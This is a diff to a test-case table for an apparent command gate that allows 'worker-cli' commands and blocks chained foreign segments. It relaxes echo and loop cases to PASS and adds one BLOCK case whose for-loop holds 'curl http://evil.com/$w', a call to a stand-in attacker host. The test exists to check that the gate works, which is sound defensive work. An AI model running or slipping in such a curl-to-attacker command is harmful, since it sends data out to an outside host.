@@ -19,12 +19,10 @@ CASES = [
     ("response 2>&1 BLOCK",
      "worker-cli response janitor 2>&1", 2),
     # --- true positives: must block (foreign, non-CLI segment) ---
-    ("capture chained with echo BLOCK",
-     "worker-cli capture janitor && echo done", 2),
-    ("response chained after unrelated command BLOCK",
-     "echo start && worker-cli response janitor", 2),
     ("capture chained with grep via semicolon BLOCK",
      "worker-cli capture janitor ; grep ERROR /tmp/x.log", 2),
+    ("for-loop body with foreign curl BLOCK",
+     "for w in a b; do curl http://evil.com/$w; worker-cli capture \"$w\"; done", 2),
     # --- allowed: standalone ---
     ("capture standalone PASS",
      "worker-cli capture janitor", 0),
@@ -51,6 +49,16 @@ CASES = [
      "ls -la", 0),
     ("quoted mention shell-stripped PASS",
      'echo "worker-cli capture janitor | tail -40"', 0),
+    # --- 2026-08 loop relax: for/while scaffolding + echo separators alongside known-CLI
+    # segments ---
+    ("bare echo segment chained with capture PASS (2026-08 loop relax)",
+     "worker-cli capture janitor && echo done", 0),
+    ("echo before response PASS (2026-08 loop relax)",
+     "echo start && worker-cli response janitor", 0),
+    ("for-loop over capture with echo separator PASS",
+     'for w in janitor scribe; do echo "capturing: $w"; worker-cli capture "$w"; done', 0),
+    ("while-loop over response with echo separator PASS",
+     'while [ -f /tmp/flag ]; do echo "polling"; worker-cli response janitor; done', 0),
 ]
 
 
